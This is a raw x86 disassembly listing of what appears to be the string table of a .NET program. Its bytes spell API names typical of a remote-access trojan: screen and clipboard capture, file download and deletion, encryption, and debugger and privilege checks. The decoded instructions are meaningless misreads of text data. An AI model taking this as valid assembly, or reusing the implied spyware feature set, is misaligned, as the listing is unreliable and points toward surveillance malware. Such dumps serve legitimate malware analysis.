  405a9b:	72 65                	jb     0x405b02
  405a9d:	61                   	popa
  405a9e:	64 53                	fs push %ebx
  405aa0:	61                   	popa
  405aa1:	66 65 4f             	gs dec %di
  405aa4:	62 6a 65             	bound  %ebp,0x65(%edx)
  405aa7:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  405aab:	6f                   	outsl  %ds:(%esi),(%dx)
  405aac:	76 69                	jbe    0x405b17
  405aae:	64 65 72 60          	fs gs jb 0x405b12
  405ab2:	31 00                	xor    %eax,(%eax)
  405ab4:	4c                   	dec    %esp
  405ab5:	69 73 74 60 31 00 24 	imul   $0x24003160,0x74(%ebx),%esi
  405abc:	49                   	dec    %ecx
  405abd:	52                   	push   %edx
  405abe:	31 33                	xor    %esi,(%ebx)
  405ac0:	2d 32 00 5f 4c       	sub    $0x4c5f0032,%eax
  405ac5:	61                   	popa
  405ac6:	6d                   	insl   (%dx),%es:(%edi)
  405ac7:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  405acb:	5f                   	pop    %edi
  405acc:	5f                   	pop    %edi
  405acd:	52                   	push   %edx
  405ace:	31 33                	xor    %esi,(%ebx)
  405ad0:	2d 32 00 6b 65       	sub    $0x656b0032,%eax
  405ad5:	72 6e                	jb     0x405b45
  405ad7:	65 6c                	gs insb (%dx),%es:(%edi)
  405ad9:	33 32                	xor    (%edx),%esi
  405adb:	00 4d 69             	add    %cl,0x69(%ebp)
  405ade:	63 72 6f             	arpl   %esi,0x6f(%edx)
  405ae1:	73 6f                	jae    0x405b52
  405ae3:	66 74 2e             	data16 je 0x405b14
  405ae6:	57                   	push   %edi
  405ae7:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  405aee:	49                   	dec    %ecx
  405aef:	6e                   	outsb  %ds:(%esi),(%dx)
  405af0:	74 33                	je     0x405b25
  405af2:	32 00                	xor    (%eax),%al
  405af4:	5f                   	pop    %edi
  405af5:	4c                   	dec    %esp
  405af6:	61                   	popa
  405af7:	6d                   	insl   (%dx),%es:(%edi)
  405af8:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  405afc:	5f                   	pop    %edi
  405afd:	5f                   	pop    %edi
  405afe:	52                   	push   %edx
  405aff:	32 00                	xor    (%eax),%al
  405b01:	24 56                	and    $0x56,%al
  405b03:	42                   	inc    %edx
  405b04:	24 4e                	and    $0x4e,%al
  405b06:	6f                   	outsl  %ds:(%esi),(%dx)
  405b07:	6e                   	outsb  %ds:(%esi),(%dx)
  405b08:	4c                   	dec    %esp
  405b09:	6f                   	outsl  %ds:(%esi),(%dx)
  405b0a:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  405b0d:	5f                   	pop    %edi
  405b0e:	32 00                	xor    (%eax),%al
  405b10:	67 65 74 5f          	addr16 gs je 0x405b73
  405b14:	55                   	push   %ebp
  405b15:	54                   	push   %esp
  405b16:	46                   	inc    %esi
  405b17:	38 00                	cmp    %al,(%eax)
  405b19:	3c 4d                	cmp    $0x4d,%al
  405b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  405b1c:	64 75 6c             	fs jne 0x405b8b
  405b1f:	65 3e 00 45 53       	gs add %al,%ds:0x53(%ebp)
  405b24:	5f                   	pop    %edi
  405b25:	53                   	push   %ebx
  405b26:	59                   	pop    %ecx
  405b27:	53                   	push   %ebx
  405b28:	54                   	push   %esp
  405b29:	45                   	inc    %ebp
  405b2a:	4d                   	dec    %ebp
  405b2b:	5f                   	pop    %edi
  405b2c:	52                   	push   %edx
  405b2d:	45                   	inc    %ebp
  405b2e:	51                   	push   %ecx
  405b2f:	55                   	push   %ebp
  405b30:	49                   	dec    %ecx
  405b31:	52                   	push   %edx
  405b32:	45                   	inc    %ebp
  405b33:	44                   	inc    %esp
  405b34:	00 45 53             	add    %al,0x53(%ebp)
  405b37:	5f                   	pop    %edi
  405b38:	44                   	inc    %esp
  405b39:	49                   	dec    %ecx
  405b3a:	53                   	push   %ebx
  405b3b:	50                   	push   %eax
  405b3c:	4c                   	dec    %esp
  405b3d:	41                   	inc    %ecx
  405b3e:	59                   	pop    %ecx
  405b3f:	5f                   	pop    %edi
  405b40:	52                   	push   %edx
  405b41:	45                   	inc    %ebp
  405b42:	51                   	push   %ecx
  405b43:	55                   	push   %ebp
  405b44:	49                   	dec    %ecx
  405b45:	52                   	push   %edx
  405b46:	45                   	inc    %ebp
  405b47:	44                   	inc    %esp
  405b48:	00 45 58             	add    %al,0x58(%ebp)
  405b4b:	45                   	inc    %ebp
  405b4c:	43                   	inc    %ebx
  405b4d:	55                   	push   %ebp
  405b4e:	54                   	push   %esp
  405b4f:	49                   	dec    %ecx
  405b50:	4f                   	dec    %edi
  405b51:	4e                   	dec    %esi
  405b52:	5f                   	pop    %edi
  405b53:	53                   	push   %ebx
  405b54:	54                   	push   %esp
  405b55:	41                   	inc    %ecx
  405b56:	54                   	push   %esp
  405b57:	45                   	inc    %ebp
  405b58:	00 24 49             	add    %ah,(%ecx,%ecx,2)
  405b5b:	00 53 79             	add    %dl,0x79(%ebx)
  405b5e:	73 74                	jae    0x405bd4
  405b60:	65 6d                	gs insl (%dx),%es:(%edi)
  405b62:	2e 49                	cs dec %ecx
  405b64:	4f                   	dec    %edi
  405b65:	00 45 53             	add    %al,0x53(%ebp)
  405b68:	5f                   	pop    %edi
  405b69:	43                   	inc    %ebx
  405b6a:	4f                   	dec    %edi
  405b6b:	4e                   	dec    %esi
  405b6c:	54                   	push   %esp
  405b6d:	49                   	dec    %ecx
  405b6e:	4e                   	dec    %esi
  405b6f:	55                   	push   %ebp
  405b70:	4f                   	dec    %edi
  405b71:	55                   	push   %ebp
  405b72:	53                   	push   %ebx
  405b73:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  405b77:	43                   	inc    %ebx
  405b78:	6c                   	insb   (%dx),%es:(%edi)
  405b79:	6f                   	outsl  %ds:(%esi),(%dx)
  405b7a:	73 75                	jae    0x405bf1
  405b7c:	72 65                	jb     0x405be3
  405b7e:	24 5f                	and    $0x5f,%al
  405b80:	5f                   	pop    %edi
  405b81:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405b85:	70 6f                	jo     0x405bf6
  405b87:	73 65                	jae    0x405bee
  405b89:	5f                   	pop    %edi
  405b8a:	5f                   	pop    %edi
  405b8b:	49                   	dec    %ecx
  405b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b8d:	73 74                	jae    0x405c03
  405b8f:	61                   	popa
  405b90:	6e                   	outsb  %ds:(%esi),(%dx)
  405b91:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  405b94:	5f                   	pop    %edi
  405b95:	00 43 72             	add    %al,0x72(%ebx)
  405b98:	65 61                	gs popa
  405b9a:	74 65                	je     0x405c01
  405b9c:	5f                   	pop    %edi
  405b9d:	5f                   	pop    %edi
  405b9e:	49                   	dec    %ecx
  405b9f:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba0:	73 74                	jae    0x405c16
  405ba2:	61                   	popa
  405ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba4:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  405ba7:	5f                   	pop    %edi
  405ba8:	00 76 61             	add    %dh,0x61(%esi)
  405bab:	6c                   	insb   (%dx),%es:(%edi)
  405bac:	75 65                	jne    0x405c13
  405bae:	5f                   	pop    %edi
  405baf:	5f                   	pop    %edi
  405bb0:	00 50 72             	add    %dl,0x72(%eax)
  405bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  405bb4:	6a 65                	push   $0x65
  405bb6:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  405bba:	74 61                	je     0x405c1d
  405bbc:	00 6d 73             	add    %ch,0x73(%ebp)
  405bbf:	63 6f 72             	arpl   %ebp,0x72(%edi)
  405bc2:	6c                   	insb   (%dx),%es:(%edi)
  405bc3:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  405bca:	65 6d                	gs insl (%dx),%es:(%edi)
  405bcc:	2e 43                	cs inc %ebx
  405bce:	6f                   	outsl  %ds:(%esi),(%dx)
  405bcf:	6c                   	insb   (%dx),%es:(%edi)
  405bd0:	6c                   	insb   (%dx),%es:(%edi)
  405bd1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  405bd7:	73 2e                	jae    0x405c07
  405bd9:	47                   	inc    %edi
  405bda:	65 6e                	outsb  %gs:(%esi),(%dx)
  405bdc:	65 72 69             	gs jb  0x405c48
  405bdf:	63 00                	arpl   %eax,(%eax)
  405be1:	4d                   	dec    %ebp
  405be2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405be9:	74 2e                	je     0x405c19
  405beb:	56                   	push   %esi
  405bec:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  405bf3:	73 69                	jae    0x405c5e
  405bf5:	63 00                	arpl   %eax,(%eax)
  405bf7:	52                   	push   %edx
  405bf8:	65 61                	gs popa
  405bfa:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
  405bff:	65 61                	gs popa
  405c01:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  405c06:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405c0a:	64 00 52 69          	add    %dl,%fs:0x69(%edx)
  405c0e:	6a 6e                	push   $0x6e
  405c10:	64 61                	fs popa
  405c12:	65 6c                	gs insb (%dx),%es:(%edi)
  405c14:	4d                   	dec    %ebp
  405c15:	61                   	popa
  405c16:	6e                   	outsb  %ds:(%esi),(%dx)
  405c17:	61                   	popa
  405c18:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  405c1e:	74 5f                	je     0x405c7f
  405c20:	49                   	dec    %ecx
  405c21:	73 41                	jae    0x405c64
  405c23:	74 74                	je     0x405c99
  405c25:	61                   	popa
  405c26:	63 68 65             	arpl   %ebp,0x65(%eax)
  405c29:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405c2d:	74 5f                	je     0x405c8e
  405c2f:	43                   	inc    %ebx
  405c30:	6f                   	outsl  %ds:(%esi),(%dx)
  405c31:	6e                   	outsb  %ds:(%esi),(%dx)
  405c32:	6e                   	outsb  %ds:(%esi),(%dx)
  405c33:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405c38:	00 53 65             	add    %dl,0x65(%ebx)
  405c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  405c3c:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  405c40:	70 65                	jo     0x405ca7
  405c42:	6e                   	outsb  %ds:(%esi),(%dx)
  405c43:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  405c47:	6d                   	insl   (%dx),%es:(%edi)
  405c48:	70 61                	jo     0x405cab
  405c4a:	72 65                	jb     0x405cb1
  405c4c:	4d                   	dec    %ebp
  405c4d:	65 74 68             	gs je  0x405cb8
  405c50:	6f                   	outsl  %ds:(%esi),(%dx)
  405c51:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405c55:	74 5f                	je     0x405cb6
  405c57:	43                   	inc    %ebx
  405c58:	6c                   	insb   (%dx),%es:(%edi)
  405c59:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  405c60:	00 52 65             	add    %dl,0x65(%edx)
  405c63:	70 6c                	jo     0x405cd1
  405c65:	61                   	popa
  405c66:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c69:	43                   	inc    %ebx
  405c6a:	72 65                	jb     0x405cd1
  405c6c:	61                   	popa
  405c6d:	74 65                	je     0x405cd4
  405c6f:	49                   	dec    %ecx
  405c70:	6e                   	outsb  %ds:(%esi),(%dx)
  405c71:	73 74                	jae    0x405ce7
  405c73:	61                   	popa
  405c74:	6e                   	outsb  %ds:(%esi),(%dx)
  405c75:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c78:	67 65 74 5f          	addr16 gs je 0x405cdb
  405c7c:	47                   	inc    %edi
  405c7d:	65 74 49             	gs je  0x405cc9
  405c80:	6e                   	outsb  %ds:(%esi),(%dx)
  405c81:	73 74                	jae    0x405cf7
  405c83:	61                   	popa
  405c84:	6e                   	outsb  %ds:(%esi),(%dx)
  405c85:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c88:	69 6e 73 74 61 6e 63 	imul   $0x636e6174,0x73(%esi),%ebp
  405c8f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405c93:	74 48                	je     0x405cdd
  405c95:	61                   	popa
  405c96:	73 68                	jae    0x405d00
  405c98:	43                   	inc    %ebx
  405c99:	6f                   	outsl  %ds:(%esi),(%dx)
  405c9a:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  405c9f:	74 5f                	je     0x405d00
  405ca1:	4d                   	dec    %ebp
  405ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  405ca3:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  405ca8:	6c                   	insb   (%dx),%es:(%edi)
  405ca9:	65 4d                	gs dec %ebp
  405cab:	6f                   	outsl  %ds:(%esi),(%dx)
  405cac:	64 65 00 45 6e       	fs add %al,%gs:0x6e(%ebp)
  405cb1:	74 65                	je     0x405d18
  405cb3:	72 44                	jb     0x405cf9
  405cb5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405cb9:	4d                   	dec    %ebp
  405cba:	6f                   	outsl  %ds:(%esi),(%dx)
  405cbb:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  405cc0:	6d                   	insl   (%dx),%es:(%edi)
  405cc1:	70 72                	jo     0x405d35
  405cc3:	65 73 73             	gs jae 0x405d39
  405cc6:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  405ccd:	00 43 69             	add    %al,0x69(%ebx)
  405cd0:	70 68                	jo     0x405d3a
  405cd2:	65 72 4d             	gs jb  0x405d22
  405cd5:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd6:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  405cdb:	6c                   	insb   (%dx),%es:(%edi)
  405cdc:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  405ce1:	64 65 00 46 72       	fs add %al,%gs:0x72(%esi)
  405ce6:	6f                   	outsl  %ds:(%esi),(%dx)
  405ce7:	6d                   	insl   (%dx),%es:(%edi)
  405ce8:	49                   	dec    %ecx
  405ce9:	6d                   	insl   (%dx),%es:(%edi)
  405cea:	61                   	popa
  405ceb:	67 65 00 44 72       	add    %al,%gs:0x72(%si)
  405cf0:	61                   	popa
  405cf1:	77 49                	ja     0x405d3c
  405cf3:	6d                   	insl   (%dx),%es:(%edi)
  405cf4:	61                   	popa
  405cf5:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  405cfa:	74 5f                	je     0x405d5b
  405cfc:	4d                   	dec    %ebp
  405cfd:	65 73 73             	gs jae 0x405d73
  405d00:	61                   	popa
  405d01:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  405d06:	76 6f                	jbe    0x405d77
  405d08:	6b 65 00 47          	imul   $0x47,0x0(%ebp),%esp
  405d0c:	65 74 45             	gs je  0x405d54
  405d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  405d10:	76 69                	jbe    0x405d7b
  405d12:	72 6f                	jb     0x405d83
  405d14:	6e                   	outsb  %ds:(%esi),(%dx)
  405d15:	6d                   	insl   (%dx),%es:(%edi)
  405d16:	65 6e                	outsb  %gs:(%esi),(%dx)
  405d18:	74 56                	je     0x405d70
  405d1a:	61                   	popa
  405d1b:	72 69                	jb     0x405d86
  405d1d:	61                   	popa
  405d1e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405d22:	67 65 74 5f          	addr16 gs je 0x405d85
  405d26:	41                   	inc    %ecx
  405d27:	76 61                	jbe    0x405d8a
  405d29:	69 6c 61 62 6c 65 00 	imul   $0x4900656c,0x62(%ecx,%eiz,2),%ebp
  405d30:	49 
  405d31:	44                   	inc    %esp
  405d32:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405d39:	6c                   	insb   (%dx),%es:(%edi)
  405d3a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405d3e:	6e                   	outsb  %ds:(%esi),(%dx)
  405d3f:	74 69                	je     0x405daa
  405d41:	6d                   	insl   (%dx),%es:(%edi)
  405d42:	65 54                	gs push %esp
  405d44:	79 70                	jns    0x405db6
  405d46:	65 48                	gs dec %eax
  405d48:	61                   	popa
  405d49:	6e                   	outsb  %ds:(%esi),(%dx)
  405d4a:	64 6c                	fs insb (%dx),%es:(%edi)
  405d4c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405d50:	74 54                	je     0x405da6
  405d52:	79 70                	jns    0x405dc4
  405d54:	65 46                	gs inc %esi
  405d56:	72 6f                	jb     0x405dc7
  405d58:	6d                   	insl   (%dx),%es:(%edi)
  405d59:	48                   	dec    %eax
  405d5a:	61                   	popa
  405d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  405d5c:	64 6c                	fs insb (%dx),%es:(%edi)
  405d5e:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  405d62:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  405d69:	65 
  405d6a:	00 52 65             	add    %dl,0x65(%edx)
  405d6d:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  405d71:	67 6c                	insb   (%dx),%es:(%di)
  405d73:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  405d78:	6e                   	outsb  %ds:(%esi),(%dx)
  405d79:	6c                   	insb   (%dx),%es:(%edi)
  405d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  405d7b:	61                   	popa
  405d7c:	64 46                	fs inc %esi
  405d7e:	69 6c 65 00 44 65 6c 	imul   $0x656c6544,0x0(%ebp,%eiz,2),%ebp
  405d85:	65 
  405d86:	74 65                	je     0x405ded
  405d88:	46                   	inc    %esi
  405d89:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405d90:	6e 
  405d91:	52                   	push   %edx
  405d92:	6f                   	outsl  %ds:(%esi),(%dx)
  405d93:	6c                   	insb   (%dx),%es:(%edi)
  405d94:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405d98:	6e                   	outsb  %ds:(%esi),(%dx)
  405d99:	64 6f                	outsl  %fs:(%esi),(%dx)
  405d9b:	77 73                	ja     0x405e10
  405d9d:	42                   	inc    %edx
  405d9e:	75 69                	jne    0x405e09
  405da0:	6c                   	insb   (%dx),%es:(%edi)
  405da1:	74 49                	je     0x405dec
  405da3:	6e                   	outsb  %ds:(%esi),(%dx)
  405da4:	52                   	push   %edx
  405da5:	6f                   	outsl  %ds:(%esi),(%dx)
  405da6:	6c                   	insb   (%dx),%es:(%edi)
  405da7:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405dab:	6e                   	outsb  %ds:(%esi),(%dx)
  405dac:	73 6f                	jae    0x405e1d
  405dae:	6c                   	insb   (%dx),%es:(%edi)
  405daf:	65 00 41 70          	add    %al,%gs:0x70(%ecx)
  405db3:	70 57                	jo     0x405e0c
  405db5:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  405dbc:	00 67 65             	add    %ah,0x65(%edi)
  405dbf:	74 5f                	je     0x405e20
  405dc1:	4e                   	dec    %esi
  405dc2:	61                   	popa
  405dc3:	6d                   	insl   (%dx),%es:(%edi)
  405dc4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405dc8:	74 54                	je     0x405e1e
  405dca:	65 6d                	gs insl (%dx),%es:(%edi)
  405dcc:	70 46                	jo     0x405e14
  405dce:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405dd5:	00 
  405dd6:	47                   	inc    %edi
  405dd7:	65 74 46             	gs je  0x405e20
  405dda:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405de1:	00 
  405de2:	67 65 74 5f          	addr16 gs je 0x405e45
  405de6:	4d                   	dec    %ebp
  405de7:	61                   	popa
  405de8:	63 68 69             	arpl   %ebp,0x69(%eax)
  405deb:	6e                   	outsb  %ds:(%esi),(%dx)
  405dec:	65 4e                	gs dec %esi
  405dee:	61                   	popa
  405def:	6d                   	insl   (%dx),%es:(%edi)
  405df0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405df4:	74 5f                	je     0x405e55
  405df6:	4f                   	dec    %edi
  405df7:	53                   	push   %ebx
  405df8:	46                   	inc    %esi
  405df9:	75 6c                	jne    0x405e67
  405dfb:	6c                   	insb   (%dx),%es:(%edi)
  405dfc:	4e                   	dec    %esi
  405dfd:	61                   	popa
  405dfe:	6d                   	insl   (%dx),%es:(%edi)
  405dff:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e03:	74 5f                	je     0x405e64
  405e05:	55                   	push   %ebp
  405e06:	73 65                	jae    0x405e6d
  405e08:	72 4e                	jb     0x405e58
  405e0a:	61                   	popa
  405e0b:	6d                   	insl   (%dx),%es:(%edi)
  405e0c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e10:	74 50                	je     0x405e62
  405e12:	72 6f                	jb     0x405e83
  405e14:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e17:	73 65                	jae    0x405e7e
  405e19:	73 42                	jae    0x405e5d
  405e1b:	79 4e                	jns    0x405e6b
  405e1d:	61                   	popa
  405e1e:	6d                   	insl   (%dx),%es:(%edi)
  405e1f:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  405e24:	65 54                	gs push %esp
  405e26:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  405e2d:	5f                   	pop    %edi
  405e2e:	4c                   	dec    %esp
  405e2f:	61                   	popa
  405e30:	73 74                	jae    0x405ea6
  405e32:	57                   	push   %edi
  405e33:	72 69                	jb     0x405e9e
  405e35:	74 65                	je     0x405e9c
  405e37:	54                   	push   %esp
  405e38:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  405e3f:	74 65                	je     0x405ea6
  405e41:	4c                   	dec    %esp
  405e42:	69 6e 65 00 4c 6f 63 	imul   $0x636f4c00,0x65(%esi),%ebp
  405e49:	61                   	popa
  405e4a:	6c                   	insb   (%dx),%es:(%edi)
  405e4b:	4d                   	dec    %ebp
  405e4c:	61                   	popa
  405e4d:	63 68 69             	arpl   %ebp,0x69(%eax)
  405e50:	6e                   	outsb  %ds:(%esi),(%dx)
  405e51:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e55:	74 54                	je     0x405eab
  405e57:	79 70                	jns    0x405ec9
  405e59:	65 00 4d 65          	add    %cl,%gs:0x65(%ebp)
  405e5d:	74 68                	je     0x405ec7
  405e5f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e60:	64 42                	fs inc %edx
  405e62:	61                   	popa
  405e63:	73 65                	jae    0x405eca
  405e65:	00 43 6f             	add    %al,0x6f(%ebx)
  405e68:	6e                   	outsb  %ds:(%esi),(%dx)
  405e69:	73 6f                	jae    0x405eda
  405e6b:	6c                   	insb   (%dx),%es:(%edi)
  405e6c:	65 41                	gs inc %ecx
  405e6e:	70 70                	jo     0x405ee0
  405e70:	6c                   	insb   (%dx),%es:(%edi)
  405e71:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  405e78:	42                   	inc    %edx
  405e79:	61                   	popa
  405e7a:	73 65                	jae    0x405ee1
  405e7c:	00 43 6c             	add    %al,0x6c(%ebx)
  405e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e80:	73 65                	jae    0x405ee7
  405e82:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405e86:	70 6f                	jo     0x405ef7
  405e88:	73 65                	jae    0x405eef
  405e8a:	00 45 64             	add    %al,0x64(%ebp)
  405e8d:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  405e94:	77 
  405e95:	73 61                	jae    0x405ef8
  405e97:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  405e9b:	74 61                	je     0x405efe
  405e9d:	74 65                	je     0x405f04
  405e9f:	00 53 65             	add    %dl,0x65(%ebx)
  405ea2:	74 54                	je     0x405ef8
  405ea4:	68 72 65 61 64       	push   $0x64616572
  405ea9:	45                   	inc    %ebp
  405eaa:	78 65                	js     0x405f11
  405eac:	63 75 74             	arpl   %esi,0x74(%ebp)
  405eaf:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  405eb6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  405eba:	74 41                	je     0x405efd
  405ebc:	70 61                	jo     0x405f1f
  405ebe:	72 74                	jb     0x405f34
  405ec0:	6d                   	insl   (%dx),%es:(%edi)
  405ec1:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ec3:	74 53                	je     0x405f18
  405ec5:	74 61                	je     0x405f28
  405ec7:	74 65                	je     0x405f2e
  405ec9:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  405ecd:	65 74 65             	gs je  0x405f35
  405ed0:	00 57 72             	add    %dl,0x72(%edi)
  405ed3:	69 74 65 00 54 68 72 	imul   $0x65726854,0x0(%ebp,%eiz,2),%esi
  405eda:	65 
  405edb:	61                   	popa
  405edc:	64 53                	fs push %ebx
  405ede:	74 61                	je     0x405f41
  405ee0:	74 69                	je     0x405f4b
  405ee2:	63 41 74             	arpl   %eax,0x74(%ecx)
  405ee5:	74 72                	je     0x405f59
  405ee7:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%edx),%esp
  405eee:	54                   	push   %esp
  405eef:	41                   	inc    %ecx
  405ef0:	54                   	push   %esp
  405ef1:	68 72 65 61 64       	push   $0x64616572
  405ef6:	41                   	inc    %ecx
  405ef7:	74 74                	je     0x405f6d
  405ef9:	72 69                	jb     0x405f64
  405efb:	62 75 74             	bound  %esi,0x74(%ebp)
  405efe:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405f02:	6d                   	insl   (%dx),%es:(%edi)
  405f03:	70 69                	jo     0x405f6e
  405f05:	6c                   	insb   (%dx),%es:(%edi)
  405f06:	65 72 47             	gs jb  0x405f50
  405f09:	65 6e                	outsb  %gs:(%esi),(%dx)
  405f0b:	65 72 61             	gs jb  0x405f6f
  405f0e:	74 65                	je     0x405f75
  405f10:	64 41                	fs inc %ecx
  405f12:	74 74                	je     0x405f88
  405f14:	72 69                	jb     0x405f7f
  405f16:	62 75 74             	bound  %esi,0x74(%ebp)
  405f19:	65 00 48 65          	add    %cl,%gs:0x65(%eax)
  405f1d:	6c                   	insb   (%dx),%es:(%edi)
  405f1e:	70 4b                	jo     0x405f6b
  405f20:	65 79 77             	gs jns 0x405f9a
  405f23:	6f                   	outsl  %ds:(%esi),(%dx)
  405f24:	72 64                	jb     0x405f8a
  405f26:	41                   	inc    %ecx
  405f27:	74 74                	je     0x405f9d
  405f29:	72 69                	jb     0x405f94
  405f2b:	62 75 74             	bound  %esi,0x74(%ebp)
  405f2e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405f32:	6e                   	outsb  %ds:(%esi),(%dx)
  405f33:	65 72 61             	gs jb  0x405f97
  405f36:	74 65                	je     0x405f9d
  405f38:	64 43                	fs inc %ebx
  405f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  405f3b:	64 65 41             	fs gs inc %ecx
  405f3e:	74 74                	je     0x405fb4
  405f40:	72 69                	jb     0x405fab
  405f42:	62 75 74             	bound  %esi,0x74(%ebp)
  405f45:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  405f49:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  405f50:	77 
  405f51:	73 61                	jae    0x405fb4
  405f53:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  405f57:	74 74                	je     0x405fcd
  405f59:	72 69                	jb     0x405fc4
  405f5b:	62 75 74             	bound  %esi,0x74(%ebp)
  405f5e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405f62:	6d                   	insl   (%dx),%es:(%edi)
  405f63:	56                   	push   %esi
  405f64:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  405f6b:	74 74                	je     0x405fe1
  405f6d:	72 69                	jb     0x405fd8
  405f6f:	62 75 74             	bound  %esi,0x74(%ebp)
  405f72:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  405f76:	61                   	popa
  405f77:	6e                   	outsb  %ds:(%esi),(%dx)
  405f78:	64 61                	fs popa
  405f7a:	72 64                	jb     0x405fe0
  405f7c:	4d                   	dec    %ebp
  405f7d:	6f                   	outsl  %ds:(%esi),(%dx)
  405f7e:	64 75 6c             	fs jne 0x405fed
  405f81:	65 41                	gs inc %ecx
  405f83:	74 74                	je     0x405ff9
  405f85:	72 69                	jb     0x405ff0
  405f87:	62 75 74             	bound  %esi,0x74(%ebp)
  405f8a:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  405f8e:	64 65 4d             	fs gs dec %ebp
  405f91:	6f                   	outsl  %ds:(%esi),(%dx)
  405f92:	64 75 6c             	fs jne 0x406001
  405f95:	65 4e                	gs dec %esi
  405f97:	61                   	popa
